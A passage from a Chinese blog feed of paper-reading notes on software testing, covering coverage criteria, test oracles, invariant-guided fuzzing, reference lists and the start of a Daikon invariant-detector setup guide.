mathvariant="normal">¬</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∨</mo><msub><mi>G</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∨</mo><msub><mi>G</mi><mn>3</mn></msub><mo>⇔</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo stretchy="false">)</mo><mo>⇒</mo><msub><mi mathvariant="normal">∃</mi><mrow><mi>t</mi><mi>c</mi><mo>∈</mo><mi>T</mi></mrow></msub><mo separator="true">⋅</mo><msub><mi>S</mi><mrow><mi>p</mi><mi>r</mi><mi>e</mi></mrow></msub><mo stretchy="false">(</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo><mo>∧</mo><mi mathvariant="normal">¬</mi><mo stretchy="false">(</mo><msub><mi>G</mi><mn>1</mn></msub><mo>∨</mo><msub><mi>G</mi><mn>2</mn></msub><mo>∨</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>G</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\neg (G_1 \vee G_2 ... \vee G_3 \Leftrightarrow true) \Rightarrow \exist_{tc\in T} · S_{pre}(tc)\wedge \neg (G_1\vee G_2 \vee ...G_n)(tc)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇔</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></eq></li><li>(3) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">∃</mi><mrow><mi>t</mi><mi>c</mi><mo>∈</mo><mi>T</mi></mrow></msub><mo separator="true">⋅</mo><mi mathvariant="normal">¬</mi><mo stretchy="false">(</mo><msub><mi>S</mi><mi>p</mi></msub><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\exist_{tc\in T} · \neg (S_pre(tc))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">¬</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">re</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">))</span></span></span></span></eq></li><li>(4) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">∀</mi><mrow><mi>p</mi><mo>∈</mo><mi>P</mi><mi>p</mi><mi>p</mi><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo></mrow></msub><msub><mi mathvariant="normal">∃</mi><mrow><mi>t</mi><mi>c</mi><mo>∈</mo><mi>T</mi></mrow></msub><mo separator="true">⋅</mo><mi>t</mi><mi>r</mi><mi>a</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall_{p\in Ppp(P)} \exist_{tc\in T} · traversed(p,tc)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord">∀</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight">Ppp</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord">∃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight">c</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">erse</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></eq></li></ul></li><li>该标准称为场景路径覆盖SPC。 该标准建议生成的测试集覆盖规范中的所有功能场景和程序中的所有代表程序路径。具体来说满足以4个条件<ul><li>(1)对于每个功能场景，必须存在一个在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 中的测试用例满足功能场景的测试条件</li><li>(2)如果所有守卫条件的析取不能覆盖操作的受限域，那么必须存在一个在 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq> 中的测试用例满足所有守卫条件析取的否定</li><li>(3)必须存在一个违反前置条件的测试用例</li><li>(4)对于每个代表性程序路径，必须存在一个测试用例在程序中遍历了这个路径，用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi><mi>r</mi><mi>a</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><mi>t</mi><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">traversed(p,tc)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">erse</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></eq> 表示</li></ul></li><li>该测试标准中<ul><li>(1)(2)共同体现了基于精确定义的功能性测试场景测试条件的等价类划分技术来生成测试用例[30,31]</li><li>(3)不能帮助确定测试用例是否发生了错误，因为SOFL中的置-后置风格规范允许在违反前置条件时程序的任何行为，这与完善的精化理论[32]一致，但它可以起到类似于健壮性测试技术[33]的作用，并帮助测试者或开发者判断在这种情况下程序的行为对用户来说是否可接受。</li><li>(4) 对应于简单路径覆盖测试[31]</li></ul></li></ul><h5 id="criterion-2" tabindex="-1">Criterion 2</h5><h2 id tabindex="-1"></h2><p>P. W. O’Hearn, “Continuous reasoning: Scaling the impact of formal<br>methods,” in Proceedings of the 33rd annual ACM/IEEE symposium<br>on logic in computer science, 2018, pp. 13–25.</p><h2 id="-1" tabindex="-1"></h2><p>Krka, I.; Brun, Y.; Medvidovic, N. Automatically Mining Specifications from Invocation Traces and Method Invariants; Technical Report; Citeseer; Center for Systems and Software Engineering, University of Southern California: Los Angeles, CA, USA, 2013. [Google Scholar]</p><h2 id="-2" tabindex="-1"></h2><p>De Caso, G.; Braberman, V.; Garbervetsky, D.; Uchitel, S. Automated abstractions for contract validation. IEEE Trans. Softw. Eng. 2010, 38, 141–162. [Google Scholar] [CrossRef]</p><h2 id="-3" tabindex="-1"></h2><p>David R. MacIver, Zac Hatfield-Dodds, and Many Other<br>Contributors. Hypothesis: A new approach to property based testing. Journal of Open Source Software,<br>4(43):1891, 2019.</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不变量与测试用例相关论文</title>
      <link href="/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E5%8F%98%E9%87%8F%E4%B8%8E%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/"/>
      <url>/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/%E5%8F%98%E9%87%8F%E4%B8%8E%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%E7%9B%B8%E5%85%B3%E8%AE%BA%E6%96%87/</url>
      
        <content type="html"><![CDATA[<h2 id="2-the-oracle-problem-in-software-testing%3A-a-survey" tabindex="-1">2 The Oracle Problem in Software Testing: A Survey</h2><ul><li>引用：Barr E T, Harman M, McMinn P, et al. The oracle problem in software testing: A survey[J]. IEEE transactions on software engineering, 2014, 41(5): 507-525.</li><li>CCF A TSE</li><li><a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=6963470">链接</a></li></ul><h3 id="2.0-%E6%91%98%E8%A6%81" tabindex="-1">2.0 摘要</h3><ul><li><p>本文提供了对测试预言问题的当前方法的全面调查，以及在这一重要的软件测试研究和实践领域的分析趋势。</p></li><li><p>在软件测试的许多工作中，我们试图将测试过程尽可能地自动化，以使测试更快、更便宜和更可靠。为此，我们需要一个测试预言，这是一种能够区分被测系统（System under Testing SUT）的正确行为和错误行为的. 然而，目前程序自动化测试预言的问题关注的少</p></li><li><p>如何利用测试预言（test oracle）来自动化地验证被测系统（SUT）的行为是否符合预期，有以下两种情况</p><ul><li>如果SUT的开发遵循了良好的测试设计原则，并且有详细正式的规范描述了预期行为，那么测试预言的成本问题可以通过自动化的测试语言解决，无需人工干预</li><li>如果SUT没有完整的规范，但存在部分规范，可以构建一个部分测试预言来回答某些输入的问题。这种部分测试预言可以使用形态测试（metamorphic testing）来构建（基于已知的期望行为之间的关系），或者从执行或文档中推导出神谕信息。</li></ul></li><li><p>在工业界，普遍没有完整的规范，因此测试人员需要为所有测试用例手动检查系统行为，此时，自动化测试方法必须人工解决oracle成本问题。本文旨在通过提供对测试预言问题的现有文献的全面回顾和分析，帮助应对这一挑战。</p></li><li><p>我们为解决测试预言问题的四个广泛类别的解决方案绘制了增长趋势，我们在第4、5、6和7节中对这些进行了调查。这四个类别包括：</p><ul><li>可以指定测试预言的方法（第4节）；</li><li>可以派生测试预言的方法（第5节）；</li><li>可以从隐性信息构建测试预言的方法（第6节）；以及</li><li>没有可用的自动化预言，但仍然可以减少人类努力的情况（第7节）。</li><li>最后，第8节以结束语作为结论。</li></ul></li></ul><h3 id="2.1-%E9%87%8D%E8%A6%81%E5%86%85%E5%AE%B9" tabindex="-1">2.1 重要内容</h3><h4 id="derived-test-oracles-%E6%B4%BE%E7%94%9F%E6%B5%8B%E8%AF%95oracle" tabindex="-1">DERIVED TEST ORACLES 派生测试Oracle</h4><ul><li>指通过各种工件（如，文档，系统运行）或 北侧系统的属性或其它版本的信息中区分系统的正确与错误行为。</li></ul><h4 id="system-executions-%E7%B3%BB%E7%BB%9F%E8%BF%90%E8%A1%8C-%26-invariant-detection" tabindex="-1">System Executions 系统运行 &amp; Invariant Detection</h4><ul><li>系统执行跟踪可以用来派生测试oracle,或者通过将不正确的执行与预期执行对齐降低人工测试成本</li><li>接下来讨论从系统运行跟踪中的两种技术： 不变量检测和规范挖掘</li><li>不变量检测在计算上可能是昂贵的，因此采用了增量[22]、[171]和轻量级静态分析[39]、[63]。一份技术报告总结了各种动态分析技术[157]。模型推断[90]、[187]也可以被视为一种不变量生成的形式，其中不变量被表达为一个模型（通常是一个FSM）。Ratcliff等人使用基于搜索的软件工程(SBSE) [84]来寻找不变量，[153]由突变测试指导。</li></ul><h2 id="3-the-use-of-likely-invariants-as-feedback-for-fuzzers" tabindex="-1">3 The use of likely invariants as feedback for fuzzers</h2><ul><li>引用：Fioraldi A, D’Elia D C, Balzarotti D. The use of likely invariants as feedback for fuzzers[C], 30th USENIX Security Symposium (USENIX Security 21). 2021: 2829-2846.</li><li>CCF A USENIX Security</li><li><a href="https://www.usenix.org/system/files/sec21-fioraldi.pdf">链接</a></li><li><a href="https://github.com/eurecom-s3/invscov">代码</a></li></ul><h3 id="3.0-%E6%91%98%E8%A6%81%26%E4%BB%8B%E7%BB%8D" tabindex="-1">3.0 摘要&amp;介绍</h3><ul><li>模糊测试是发现软件错误的很有效的方法，一个主要限制是目前流行的基于覆盖率引导的模糊测试优化了对程序不同部分的访问，担当仅凭可达性不可以触发漏洞时，就会遇到困难。</li><li>本文提出一种反馈机制，通过考虑程序变量之间的通常值和关系来增强代码覆盖。谓词，我们在基本块级别学习可能的不变量，并划分程序状态空间。我们的反馈机制可以区分输入何时违反了一个或多个不变量并对其进行建立，从而改进代码覆盖通常提供的程序状态相似。</li><li>我们在一个名为INVSCOV的原型上使用了我们的技术，该原型基于LLVM和AFL++基础上进行开发。</li><li>我们的实验表明，与使用纯代码覆盖反馈的模糊器相比，我们的方法可以发现更多且不同类型的错误。</li><li>本文贡献：<ul><li>一种新的反馈机制，结合了控制流和从挖掘的不变量中抽象出的程序状态；</li><li>基于LLVM和AFL++的我们方法的一个原型实现，名为INVSCOV；</li><li>针对经典和上下文敏感的边覆盖率，对我们方法的有效性进行了评估。</li></ul></li></ul><h3 id="3.1-%E4%B8%BB%E8%A6%81%E5%86%85%E5%AE%B9" tabindex="-1">3.1 主要内容</h3><ul><li><p>我们从一组测试用例语料库开始，就像在实际情况下的真实应用程序一样，这些测试用例不能代表所有的应用状态，然后我们修改fuzzer使其对偏离初始语料库的不变量的行为更加敏感。</p></li><li><p>我们这么做的直觉是：此时，不变量代表的是执行的属性，而不是程序本身的属性。</p></li><li><p>设计三类不变量剪枝原则</p><ul><li><ol><li>舍弃不可能违反的不变量</li></ol></li><li><ol start="2"><li>舍弃结合了不相关变量的不变量</li></ol></li><li><ol start="3"><li>当不变量重叠时，舍弃更弱的不变量</li></ol></li></ul></li></ul><h3 id="3.2-%E5%AE%9E%E7%8E%B0" tabindex="-1">3.2 实现</h3><ul><li><p>使用LLVM [43]和DAIKON [25]可能不变式系统进行基于不变式的模糊测试。</p></li><li><p>分为两个阶段</p><ul><li><strong>学习阶段</strong>：记录进行不变量挖掘所需要的有关程序状态的信息，通过在增强的程序上运行输入来实现。输入可从集中方式获得（我们的实验中从24小时覆盖率引导的模糊测试会话生成的种子）。不变量挖掘使用Daikon，由于我们的技术应用于基本块级别，故不变量计算成本线性依赖于基本块的数量</li><li><strong>插桩阶段</strong>：随后将可能的不变式信息编码到程序函数中，以将它们暴露给覆盖率引导的模糊器。我们转换后的程序可以在任何基于AFL的模糊器上开箱即用。</li></ul></li><li><p>状态不变量学习：修改Daikon使用适配LLVM IR（有点工作）</p></li></ul><h2 id="5-automated-patch-correctness-assessment%3A-how-far-are-we" tabindex="-1">5 Automated patch correctness assessment: How far are we</h2><ul><li>引用：Wang S, Wen M, Lin B, et al. Automated patch correctness assessment: How far are we?[C], Proceedings of the 35th IEEE/ACM International Conference on Automated Software Engineering. 2020: 968-980.</li><li>CCF A ASE</li><li><a href="https://dl.acm.org/doi/abs/10.1145/3324884.3416590">链接</a></li></ul><h2 id tabindex="-1"></h2><p>H. Ye, M. Martinez, T. Durieux, and M. Monperrus, “A comprehensive<br>study of automatic program repair on the quixbugs benchmark,” in Proc.<br>IEEE 1st Int. Workshop Intell. Bug Fixing, 2019, pp. 1–10</p><h2 id="-1" tabindex="-1"></h2><p>J. Yang, A. Zhikhartsev, Y. Liu, and L. Tan, “Better test cases for better<br>automated program repair,” inProc. 11th Joint Meeting Found. Softw. Eng.,<br>2017, pp. 831–841.</p><h2 id="-2" tabindex="-1"></h2><p>Gordon Fraser and Andrea Arcuri. 2011. Evosuite: automatic test suite generationfor object-oriented software. InESEC/FSE. 416–419.</p><h2 id="-3" tabindex="-1"></h2><p>Z. Y. Ding, Y. Lyu, C. Timperley, and C. L. Goues, “Leveraging program<br>invariants to promote population diversity in search-based automatic program repair</p><h2 id="-4" tabindex="-1"></h2><p>G. Yang, C. S. Pas˘ areanu, and S. Khurshid, “Memoized symbolic ˘<br>execution,” in Proceedings of the 2012 International Symposium on<br>Software Testing and Analysis, 2012, pp. 144–154.</p><h2 id="-5" tabindex="-1"></h2><p>D. Schuler, V. Dallmeier, and A. Zeller. EfficientMutation Testing by Checking Invariant Violations. InISSTA ’09, pages 69–80. ACM, 2009</p><h2 id="combined-static-and-dynamic-automated-test-generation" tabindex="-1">Combined static and dynamic automated test generation</h2><ul><li>引用：Zhang S, Saff D, Bu Y, et al. Combined static and dynamic automated test generation[C]//Proceedings of the 2011 international symposium on software testing and analysis. 2011: 353-363.</li><li>CCF A ISSTA</li><li><a href="https://dl.acm.org/doi/epdf/10.1145/2001420.2001463">链接</a></li></ul><h2 id="-6" tabindex="-1"></h2><p>J. Zhang, J. Chen, D. Hao, Y. Xiong, B. Xie, L. Zhang, and H. Mei,<br>“Search-based inference of polynomial metamorphic relations,” in<br>Proceedings of the 29th ACM/IEEE International Conference on<br>Automated Software Engineering, ser. ASE ’14. New York, NY,<br>USA: Association for Computing Machinery, 2014, p. 701–712.<br>[Online]. Available: <a href="https://doi.org/10.1145/2642937.2642994">https://doi.org/10.1145/2642937.2642994</a></p><h2 id="-7" tabindex="-1"></h2><p>动态检测到的不变量还可以帮助删除无意义的测试（违反前提条件）并推断何时失败（违反后置条件）[23]<br>C. Pacheco, M.D. Ernst, Eclat: Automatic generation and classification of test inputs, ECOOP (2005) 504–527</p><h2 id="-8" tabindex="-1"></h2><p>S. Artzi, M. D. Ernst, A. Kiezun, C. Pacheco, and J. H. Perkins, _<br>“Finding the needles in the haystack: Generating legal test inputs<br>for object-oriented programs,” in Proc. 1st Workshop Model-Based<br>Testing Object-Oriented Syst., Oct. 23, 2006.</p><h2 id="from-daikon" tabindex="-1">From Daikon</h2><p>例如用于测试选择和优先级排序；更多的覆盖度量指标会产生更好的测试套件[21,22]</p><p>M. Harder, J. Mellen, M.D. Ernst, Improving test suites via operational abstraction, ICSE (2003) 60–71.<br>T. Xie, D. Notkin, Tool-assisted unit test selection based on operational violations, ASE (2003) 40–48.</p><h2 id="a-survey-on-automatic-test-data-generation-1999-8%E9%A1%B5" tabindex="-1">A Survey on Automatic Test Data Generation 1999 8页</h2><p><a href="https://faculty.cc.gatech.edu/~harrold/6340/cs6340_fall2009/Readings/test.data.genration.survey.pdf">https://faculty.cc.gatech.edu/~harrold/6340/cs6340_fall2009/Readings/test.data.genration.survey.pdf</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>daikon使用</title>
      <link href="/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/daikon%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
      <url>/2024/03/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/invariant/daikon%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h2><ul><li><p>Daikon是一个动态检测不变量的工具</p></li><li><p>不变量是程序中某个特定点上保持为真的属性，这些通常出现在断言语句，文档和形式化规范中。</p></li><li><p>不变量在程序理解和其它许多应用中都非常有用，例如，不变量可以是</p><ul><li>x.field &gt; abs(y)</li><li>y = 2 * x + 3</li><li>数组a是有序的</li><li>对于所有的列表对象lst，kst.next.prev = lst</li><li>等等，用户可以扩展Daikon以添加新的属性</li></ul></li><li><p>动态不变量检测通过运行程序，观察程序计算的值，然后报告在观察到的执行过程中始终为真的属性。</p><ul><li>Daikon可以在C、C++、C#、Eiffel、F#、Java、Perl和Visual Basic程序中检测属性</li><li>在spreedsheet文件中</li><li>以及其它数据源中（动态不变量监测是一种可以应用于任意数据的机器学习技术）</li></ul></li><li><p>Daikon完全开源</p></li><li><p>Daikon详情参考<a href="https://plse.cs.washington.edu/daikon/download/doc/daikon.html#Introduction">daion用户手册</a></p></li><li><p>本文记录本人使用daikon过程</p></li></ul><h2 id="2-%E4%B8%8B%E8%BD%BDdaikon" tabindex="-1">2 下载Daikon</h2><ul><li>照着用户手册下载即可</li><li>注意daikon需要的shell环境变量</li></ul><pre><code class="language-bash">export DAIKONDIR=daikonparent/daikon-5.8.18 # daikon的安装目录source $DAIKONDIR/scripts/daikon.bashrc</code></pre><h2 id="3-%E4%BD%BF%E7%94%A8%E6%A1%88%E4%BE%8B" tabindex="-1">3 使用案例</h2><h3 id="c%2Fc%2B%2B" tabindex="-1">C/C++</h3><ol><li>需要使用 <code>gcc</code> 和 编译选项 <code>-gdwarf-2 -no-pie</code>产生可执行文件<ul><li>对于通过<code>./configure</code>生成的Makefile,在<code>./configure</code>前加入<code>CC=gcc CFLAGS=&quot;-gdwarf-2 -no-pie&quot;</code>即可</li></ul></li><li>使用 kvasir 